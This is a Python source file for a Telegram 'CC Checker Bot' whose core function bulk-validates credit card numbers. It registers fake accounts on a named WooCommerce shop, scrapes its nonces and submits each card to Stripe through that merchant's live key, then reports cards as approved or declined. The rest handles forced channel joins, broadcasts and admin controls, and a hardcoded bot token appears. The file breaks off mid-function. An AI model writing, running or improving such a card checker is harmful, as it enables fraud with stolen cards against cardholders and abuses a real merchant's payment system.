import requests
import asyncio
import json
import random
import re
import os
import aiohttp
import html
from fake_useragent import UserAgent
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import logging
from datetime import datetime

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================= CONFIGURATION =================
BOT_TOKEN = "8688444889:AAFgh0wrGC9o0oSg3wlECoTbh2krXkz0i68"  # Replace with your actual bot token
ADMIN_IDS = [8899843332]  # Replace with your Telegram User ID

# Database Setup
DB_FILE = "bot_database.json"

def load_db():
    if not os.path.exists(DB_FILE):
        return {"users": [], "channels": [], "admins": ADMIN_IDS}
    try:
        with open(DB_FILE, "r") as f:
            data = json.load(f)
            if "users" not in data:
                data["users"] = []
            if "channels" not in data:
                data["channels"] = []
            if "admins" not in data:
                data["admins"] = ADMIN_IDS
            return data
    except Exception:
        return {"users": [], "channels": [], "admins": ADMIN_IDS}

def save_db(data):
    try:
        with open(DB_FILE, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving database: {e}")

# Initialize Database on Boot
db_data = load_db()
save_db(db_data)

# Premium Emoji ID definitions
E_STAR = "6170163662544707658"
E_STATS = "6294142703907116473"
E_HELP = "6294106669131503002"
E_CC = "6176905893616031802"
E_APPROVED = "6091456153462512920"
E_DECLINED = "6176742294016760397"
E_FILE = "6293797538860373333"
E_ALERT = "5318938025361679130"
E_ERROR = "5316657943188349246"
E_LOCK = "5316971840873177080"
E_UPTIME = "6129812419028982717"
E_PERCENT = "6129705083501293112"
E_RESET = "6129801569941592173"
E_USER = "6129650399977675538"
E_INFO = "6129769198773083022"
E_ADMIN = "5219899949281453881"
E_BROADCAST = "5222472119295684375"
E_KEY = "5222108309795908493"
E_JOIN = "5244820603663296299"
E_SETTINGS = "5219943216781995020"
E_BACK = "5222400230133081714"
E_PLUS = "5222148368955877900"
E_MINUS = "5246794802560774143"

def e(emoji_id, fallback=""):
    """Helper to structure premium emojis inside HTML messages."""
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

# Compatibility subclass for Styled Buttons (Bot API 9.4+)
class StyledInlineKeyboardButton(InlineKeyboardButton):
    def __init__(self, text: str, style: str = None, icon_custom_emoji_id: str = None, **kwargs):
        self._custom_style = style
        self._custom_emoji_id = icon_custom_emoji_id
        # Safely remove attributes for backward compatibility
        kwargs.pop("style", None)
        kwargs.pop("icon_custom_emoji_id", None)
        super().__init__(text=text, **kwargs)

    def to_dict(self) -> dict:
        data = super().to_dict()
        if self._custom_style is not None:
            data["style"] = self._custom_style
        if self._custom_emoji_id is not None:
            data["icon_custom_emoji_id"] = self._custom_emoji_id
        return data

def make_btn(text, callback_data=None, url=None, style=None, icon_custom_emoji_id=None):
    """Utility function to create styled inline buttons."""
    kwargs = {}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    return StyledInlineKeyboardButton(
        text=text,
        style=style,
        icon_custom_emoji_id=icon_custom_emoji_id,
        **kwargs
    )

# Statistics
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'unknown': 0,
    'errors': 0,
    'start_time': datetime.now()
}

# Global variables for processing
processing_cards = []
processing_status = {}
current_message_id = None
current_chat_id = None

def register_user(user_id):
    db = load_db()
    if user_id not in db["users"]:
        db["users"].append(user_id)
        save_db(db)

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def get_random_info():
    return {"email": f"user{random.randint(100000, 999999)}@gmail.com"}

async def check_cc(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        
        random_data = await get_random_info()
        email = random_data["email"]
        user = f"user{random.randint(100000, 999999)}"

        s = requests.Session()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers)
        
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
        
        if not nonce:
            return "DECLINED - Failed to get nonce"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': user,
            'email': email,
            'mailpoet[subscribe_on_register_active]': '1',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account-2/',
            'register': 'Register',
        }

        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers)
        
        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
        
        if not pnonce:
            return "DECLINED - Failed to get payment nonce"

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
            'referrer': 'https://radio-tecs.com',
            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
            '_stripe_version': '2024-06-20',
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        if response.status_code != 200:
            return f"DECLINED - Stripe Error: {response.status_code}"

        try:
            payment_id = response.json()['id']
        except:
            return "DECLINED - Failed to get payment ID"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://radio-tecs.com',
            'priority': 'u=1, i',
            'referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'is_woopay_preflight_check': '0',
            'payment_method': payment_id,
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': pnonce,
        }

        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get('success'):
                    return "APPROVED ✅"
                else:
                    error_data = result.get('data', {})
                    if isinstance(error_data, dict) and 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown error')
                    else:
                        error_msg = result.get('data', {}).get('message', 'Unknown error')
                    return f"DECLINED ❌ - {error_msg}"
            except json.JSONDecodeError:
                if response.text.strip() == '0':
                    return "DECLINED ❌ - Nonce failed"
                elif 'error' in response.text.lower():
                    return f"DECLINED ❌ - {response.text}"
                else:
                    return f"UNKNOWN ⚠️ - {response.text}"
        else:
            return f"HTTP Error: {response.status_code}"

    except Exception as e:
        return f"ERROR ⚠️ - {str(e)}"

# ================= FORCE JOIN MECHANISM =================
async def is_force_joined(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user has joined all required channels."""
    db = load_db()
    channels = db.get("channels", [])
    if not channels:
        return True
    
    # Admins bypass validation
    if user_id in db.get("admins", []):
        return True

    for channel in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except Exception as e:
            logger.error(f"Force Join membership error: {e}")
            return False
    return True

async def send_force_join_message(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Present Force Join interface with formatted columns (max 2 per row)."""
    db = load_db()
    channels = db.get("channels", [])
    
    buttons = []
    row = []
    for i, ch in enumerate(channels, 1):
        clean_ch = ch.replace("@", "")
        # Construct link
        url = f"https://t.me/{clean_ch}" if not ch.startswith("-100") else f"https://t.me/c/{ch[4:]}/1"
        btn = make_btn(
            text=f"{e(E_JOIN, '🔗')} Channel {i}", 
            url=url, 
            style="primary", 
            icon_custom_emoji_id=E_JOIN
        )
        row.append(btn)
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
        
    # Validation verification button
    verify_btn = make_btn(
        text=f"{e(E_APPROVED, '✅')} Verify Join", 
        callback_data="verify_join", 
        style="success", 
        icon_custom_emoji_id=E_APPROVED
    )
    buttons.append([verify_btn])
    
    markup = InlineKeyboardMarkup(buttons)
    
    join_text = (
        f"{e(E_LOCK, '🔒')} <b>Access Restricted!</b>\n\n"
        f"You must join our mandatory channels before using the bot.\n"
        f"Please click the links below to join, and then hit <b>Verify Join</b>.\n\n"
        f"{e(E_INFO, 'ℹ️')} <i>Only verified users can access the system.</i>"
    )
    
    if update.callback_query:
        await update.callback_query.message.reply_text(join_text, parse_mode="HTML", reply_markup=markup)
    else:
        await update.message.reply_text(join_text, parse_mode="HTML", reply_markup=markup)

# ================= MAIN PAGES =================
async def send_welcome(update_or_query, context, edit=False):
    """Renders the main menu dashboard."""
    keyboard = [
        [
            make_btn(f"{e(E_APPROVED, '✅')} Check CC", callback_data="check_cc", style="success", icon_custom_emoji_id=E_APPROVED),
            make_btn(f"{e(E_STATS, '📊')} Stats", callback_data="stats", style="primary", icon_custom_emoji_id=E_STATS)
        ],
        [
            make_btn(f"{e(E_FILE, '📁')} Check File", callback_data="check_file", style="primary", icon_custom_emoji_id=E_FILE),
            make_btn(f"{e(E_RESET, '🔄')} Reset Stats", callback_data="reset_stats", style="danger", icon_custom_emoji_id=E_RESET)
        ],
        [
            make_btn(f"{e(E_HELP, '❓')} Help Menu", callback_data="help", style="primary", icon_custom_emoji_id=E_HELP)
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        f"{e(E_STAR, '✨')} <b>Welcome to CC Checker Bot!</b> {e(E_STAR, '✨')}\n\n"
        f"🔍 <i>I can help you validate credit cards in real-time.</i>\n\n"
        f"📌 <b>Send me cards in this format:</b>\n"
        f"<code>5121078835045021|12|2041|111</code>\n\n"
        f"📂 <b>Or upload a .txt file containing lists of cards.</b>\n"
        f"⚡ <b>Use /chk to start validating cards.</b>\n\n"
        f"🛠 <b>Choose an option below:</b>"
    )
    
    if edit:
        await update_or_query.edit_message_text(welcome_text, parse_mode='HTML', reply_markup=reply_markup)
    else:
        if isinstance(update_or_query, Update):
            await update_or_query.message.reply_text(welcome_text, parse_mode='HTML', reply_markup=reply_markup)
        else:
            await update_or_query.reply_text(welcome_text, parse_mode='HTML', reply_markup=reply_markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Entry Command handler."""
    user_id = update.effective_user.id
    register_user(user_id)
    
    if not await is_force_joined(user_id, context):
        await send_force_join_message(update, context, user_id)
        return
        
    await send_welcome(update, context)

# ================= BROADCAST SYSTEM =================
async def run_broadcast_task(admin_id: int, message_to_send: MessageHandler, context: ContextTypes.DEFAULT_TYPE):
    """Robust background broadcast mechanism tracking progressive statistics."""
    db = load_db()
    users = db.get("users", [])
    total_users = len(users)
    
    if total_users == 0:
        await context.bot.send_message(chat_id=admin_id, text="❌ No users registered to broadcast.")
        return

    success = 0
    failed = 0
    
    status_msg = await context.bot.send_message(
        chat_id=admin_id, 
        text=f"{e(E_BROADCAST, '📢')} <b>Initializing Broadcast...</b>\n\nProgress: 0/{total_users} (0%)"
    )
    
    for i, user_id in enumerate(users, 1):
        try:
            await context.bot.copy_message(
                chat_id=user_id,
                from_chat_id=admin_id,
                message_id=message_to_send.message_id
            )
            success += 1
        except Exception as e:
            failed += 1
            logger.warning(f"Error sending broadcast to {user_id}: {e}")
        
        # Periodic update interval (every 10 users to prevent rate limiting)
        if i % 10 == 0 or i == total_users:
            pct = int((i / total_users) * 100)
            bar = "▰" * (pct // 10) + "▱" * (10 - (pct // 10))
            progress_text = (
                f"{e(E_BROADCAST, '📢')} <b>Broadcast in Progress...</b>\n\n"
                f"{bar} {pct}%\n\n"
                f"📊 <b>Stats:</b>\n"
                f"• Total: <code>{total_users}</code>\n"
                f"• Sent: <code>{success}</code>\n"
                f"• Failed: <code>{failed}</code>\n"
                f"• Processed: <code>{i}/{total_users}</code>"
            )
            try:
                await status_msg.edit_text(progress_text, parse_mode="HTML")
            except Exception:
                pass
        
        # Safe Sleep limit protection
        await asyncio.sleep(0.05)
        
    final_text = (
        f"{e(E_APPROVED, '✅')} <b>Broadcast Finished!</b>\n\n"
        f"📊 <b>Report Summary:</b>\n"
        f"• Total Database Users: <code>{total_users}</code>\n"
        f"• Delivered successfully: <code>{success}</code>\n"
        f"• Blocked / Banned: <code>{failed}</code>"
    )
    await context.bot.send_message(chat_id=admin_id, text=final_text, parse_mode="HTML")

# ================= ADMIN VIEW HANDLERS =================
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin configuration control board."""
    user_id = update.effective_user.id
    db = load_db()
    if user_id not in db.get("admins", []):
        await update.message.reply_text(f"{e(E_ERROR, '🚫')} Access Denied.")
        return

    keyboard = [
        [
            make_btn(f"{e(E_JOIN, '🔗')} Force Join Config", callback_data="admin_fj", style="primary", icon_custom_emoji_id=E_JOIN),
            make_btn(f"{e(E_BROADCAST, '📢')} Run Broadcast", callback_data="admin_bc", style="primary", icon_custom_emoji_id=E_BROADCAST)
        ],
        [
            make_btn(f"{e(E_STATS, '📊')} Check DB Stats", callback_data="admin_stats", style="success", icon_custom_emoji_id=E_STATS),
            make_btn(f"{e(E_BACK, '🔙')} Back to User View", callback_data="back_to_menu", style="danger", icon_custom_emoji_id=E_BACK)
        ]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    
    admin_text = (
        f"{e(E_ADMIN, '👑')} <b>ADMIN CONTROL DASHBOARD</b> {e(E_ADMIN, '👑')}\n\n"
        f"Manage the bot configurations, channels, and system broadcast metrics."
    )
    await update.message.reply_text(admin_text, parse_mode="HTML", reply_markup=markup)

async def show_admin_fj(query, context):
    """List and manage targeted channel lists for Force Join."""
    db = load_db()
    channels = db.get("channels", [])
    
    text = (
        f"{e(E_SETTINGS, '⚙️')} <b>MANDATORY CHANNELS</b>\n\n"
        f"Active Verification Channels:\n"
    )
    if channels:
        for i, ch in enumerate(channels, 1):
            text += f"<code>{i}.</code> {ch}\n"
    else:
        text += "<i>No restriction channels defined.</i>\n"
        
    text += f"\nAdd standard username or private Chat ID lists below."
    
    keyboard = []
    keyboard.append([make_btn(f"{e(E_PLUS, '➕')} Add Channel Link", callback_data="admin_add_ch", style="success", icon_custom_emoji_id=E_PLUS)])
    
    for i, ch in enumerate(channels):
        keyboard.append([make_btn(f"{e(E_MINUS, '➖')} Delete {ch}", callback_data=f"admin_rem_ch_{i}", style="danger", icon_custom_emoji_id=E_MINUS)])
        
    keyboard.append([make_btn(f"{e(E_BACK, '🔙')} Back to Panel", callback_data="admin_back", style="primary", icon_custom_emoji_id=E_BACK)])
    
    markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=markup)

async def show_admin_bc(query, context):
    context.user_data["waiting_for_broadcast_msg"] = True
    text = (
        f"{e(E_BROADCAST, '📢')} <b>BROADCAST WRITER</b>\n\n"
        f"Send the targeted broadcast text message or interactive post here.\n\n"
        f"<i>Type /cancel to close.</i>"
    )
    keyboard = [[make_btn(f"{e(E_BACK, '🔙')} Abort", callback_data="admin_back", style="danger", icon_custom_emoji_id=E_BACK)]]
    markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=markup)

async def show_admin_add_ch(query, context):
    context.user_data["waiting_for_channel_username"] = True
    text = (
        f"{e(E_PLUS, '➕')} <b>ADD VERIFICATION CHANNEL</b>\n\n"
        f"Enter the verification channel username (with @) or private channel identifier.\n"
        f"Format: <code>@ChannelName</code> or <code>-100XXXXXXXXXX</code>\n\n"
        f"⚠️ <i>Make sure the Bot is promoted to administrator inside this channel first!</i>"
    )
    keyboard = [[make_btn(f"{e(E_BACK, '🔙')} Cancel", callback_data="admin_fj", style="danger", icon_custom_emoji_id=E_BACK)]]
    markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=markup)

# ================= BUTTON ENGINE ACTIONS =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "verify_join":
        if await is_force_joined(user_id, context):
            await query.answer("✅ Verification successful!")
            await send_welcome(query, context, edit=True)
        else:
            await query.answer("❌ You must join all channels first!", show_alert=True)
        return
        
    if not query.data.startswith("admin_") and not await is_force_joined(user_id, context):
        await query.answer("⚠️ Complete validation check first!", show_alert=True)
        await send_force_join_message(update, context, user_id)
        return
        
    # Administrative control board routing
    if query.data == "admin_back":
        context.user_data.pop("waiting_for_channel_username", None)
        context.user_data.pop("waiting_for_broadcast_msg", None)
        
        keyboard = [
            [
                make_btn(f"{e(E_JOIN, '🔗')} Force Join Config", callback_data="admin_fj", style="primary", icon_custom_emoji_id=E_JOIN),
                make_btn(f"{e(E_BROADCAST, '📢')} Run Broadcast", callback_data="admin_bc", style="primary", icon_custom_emoji_id=E_BROADCAST)
            ],
            [
                make_btn(f"{e(E_STATS, '📊')} Check DB Stats", callback_data="admin_stats", style="success", icon_custom_emoji_id=E_STATS),
                make_btn(f"{e(E_BACK, '🔙')} Back to User View", callback_data="back_to_menu", style="danger", icon_custom_emoji_id=E_BACK)
            ]
        ]
        markup = InlineKeyboardMarkup(keyboard)
        admin_text = (
            f"{e(E_ADMIN, '👑')} <b>ADMIN CONTROL DASHBOARD</b> {e(E_ADMIN, '👑')}\n\n"
            f"Manage the bot configurations, channels, and system broadcast metrics."
        )
        await query.edit_message_text(admin_text, parse_mode="HTML", reply_markup=markup)
        
    elif query.data == "admin_fj":
        await show_admin_fj(query, context)
        
    elif query.data == "admin_bc":
        await show_admin_bc(query, context)
        
    elif query.data == "admin_stats":
        db = load_db()
        stats_text = (
            f"{e(E_STATS, '📊')} <b>DATABASE INSIGHTS</b>\n\n"
            f"👤 <b>Total Registered Users:</b> <code>{len(db.get('users', []))}</code>\n"
            f"📺 <b>Protected Channels:</b> <code>{len(db.get('channels', []))}</code>\n"
        )
        keyboard = [[make_btn(f"{e(E_BACK, '🔙')} Back", callback_data="admin_back", style="primary", icon_custom_emoji_id=E_BACK)]]
        markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(stats_text, parse_mode="HTML", reply_markup=markup)
        
    elif query.data == "admin_add_ch":
        await show_admin_add_ch(query, context)
        
    elif query.data.startswith("admin_rem_ch_"):
        idx = int(query.data.split("_")[-1])
        db = load_db()
        channels = db.get("channels", [])
        if 0 <= idx < len(channels):
            removed = channels.pop(idx)
            db["channels"] = channels
            save_db(db)
            await query.answer(f"Removed {removed}")
        await show_admin_fj(query, context)
    
    # Standard Interactive Route
    elif query.data == "check_cc":
        await query.edit_message_text(
            f"📝 <b>Please enter the CC details</b>\n\n"
            f"Format: <code>5121078835045021|12|2041|111</code>\n"
            f"Multiple cards should be added one per line.\n\n"
            f"<i>Send /cancel to terminate</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_cc'] = True
        
    elif query.data == "check_file":
        await query.edit_message_text(
            f"📂 <b>Upload your list .txt file</b>\n"
            f"Ensure each line maps one card profile.\n\n"
            f"Format: <code>5121078835045021|12|2041|111</code>\n\n"
            f"<i>Send /cancel to terminate</i>",
            parse_mode='HTML'
        )
        context.user_data['waiting_for_file'] = True
        
    elif query.data == "stats":
        await show_stats_callback(query, context)
        
    elif query.data == "reset_stats":
        await reset_stats_callback(query, context)
        
    elif query.data == "help":
        await show_help_callback(query, context)
        
    elif query.data == "back_to_menu":
        await send_welcome(query, context, edit=True)

# ================= VIEW CONTROL BLOCKS =================
async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_force_joined(user_id, context):
        await send_force_join_message(update, context, user_id)
        return
        
    uptime = datetime.now() - stats['start_time']
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    stats_text = (
        f"{e(E_STATS, '📊')} <b>━━━━━━ STATISTICS ━━━━━━</b> {e(E_STATS, '📊')}\n\n"
        f"🕐 <b>Uptime:</b> <code>{hours}h {minutes}m</code>\n"
        f"📊 <b>Total Checked:</b> <code>{stats['total']}</code>\n\n"
        f"{e(E_APPROVED, '✅')} <b>Approved:</b> <code>{stats['approved']}</code>\n"
        f"{e(E_DECLINED, '❌')} <b>Declined:</b> <code>{stats['declined']}</code>\n"
        f"{e(E_ALERT, '⚠️')} <b>Unknown:</b> <code>{stats['unknown']}</code>\n"
        f"{e(E_ERROR, '🚫')} <b>Errors:</b> <code>{stats['errors']}</code>\n\n"
        f"📈 <b>Success Rate:</b> <code>{stats['approved']/stats['total']*100:.1f}%</code>" if stats['total'] > 0 else "📈 <b>Success Rate:</b> <code>0%</code>"
    )
    
    keyboard = [[make_btn(f"{e(E_RESET, '🔄')} Refresh Stats", callback_data="stats", style="success", icon_custom_emoji_id=E_RESET)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(stats_text, parse_mode='HTML', reply_markup=reply_markup)

async def show_stats_callback(query, context):
    uptime = datetime.now() - stats['start_time']
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    stats_text = (
        f"{e(E_STATS, '📊')} <b>━━━━━━ STATISTICS ━━━━━━</b> {e(E_STATS, '📊')}\n\n"
        f"🕐 <b>Uptime:</b> <code>{hours}h {minutes}m</code>\n"
        f"📊 <b>Total Checked:</b> <code>{stats['total']}</code>\n\n"
        f"{e(E_APPROVED, '✅')} <b>Approved:</b> <code>{stats['approved']}</code>\n"
        f"{e(E_DECLINED, '❌')} <b>Declined:</b> <code>{stats['declined']}</code>\n"
        f"{e(E_ALERT, '⚠️')} <b>Unknown:</b> <code>{stats['unknown']}</code>\n"
        f"{e(E_ERROR, '🚫')} <b>Errors:</b> <code>{stats['errors']}</code>\n\n"
        f"📈 <b>Success Rate:</b> <code>{stats['approved']/stats['total']*100:.1f}%</code>" if stats['total'] > 0 else "📈 <b>Success Rate:</b> <code>0%</code>"
    )
    
    keyboard = [[make_btn(f"{e(E_RESET, '🔄')} Refresh Stats", callback_data="stats", style="success", icon_custom_emoji_id=E_RESET)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(stats_text, parse_mode='HTML', reply_markup=reply_markup)

async def reset_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_force_joined(user_id, context):
        await send_force_join_message(update, context, user_id)
        return
        
    global stats
    stats = {'total': 0, 'approved': 0, 'declined': 0, 'unknown': 0, 'errors': 0, 'start_time': datetime.now()}
    await update.message.reply_text(f"{e(E_RESET, '🔄')} <b>Statistics successfully reset.</b>", parse_mode='HTML')

async def reset_stats_callback(query, context):
    global stats
    stats = {'total': 0, 'approved': 0, 'declined': 0, 'unknown': 0, 'errors': 0, 'start_time': datetime.now()}
    await query.edit_message_text(
        f"{e(E_RESET, '🔄')} <b>Statistics successfully reset.</b>\n\nAll session records are cleared.",
        parse_mode='HTML'
    )

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_force_joined(user_id, context):
        await send_force_join_message(update, context, user_id)
        return
        
    help_text = (
        f"{e(E_HELP, '❓')} <b>━━━━━━ HELP SYSTEM ━━━━━━</b> {e(E_HELP, '❓')}\n\n"
        f"🤖 <b>Bot Commands:</b>\n"
        f"• <code>/start</code> - Show menu dashboard\n"
        f"• <code>/chk</code> - Initiate Card checker\n"
        f"• <code>/stats</code> - Show stats analytics\n"
        f"• <code>/reset</code> - Clear session statistics\n\n"
        f"📝 <b>Format Protocol:</b>\n"
        f"<code>5121078835045021|12|2041|111</code>\n"
        f"<i>(CardNumber|Month|Year|CVC)</i>\n\n"
        f"📂 <b>Data Lists:</b>\n"
        f"Simply upload your plaintext .txt list file with cards formatted line-by-line."
    )
    
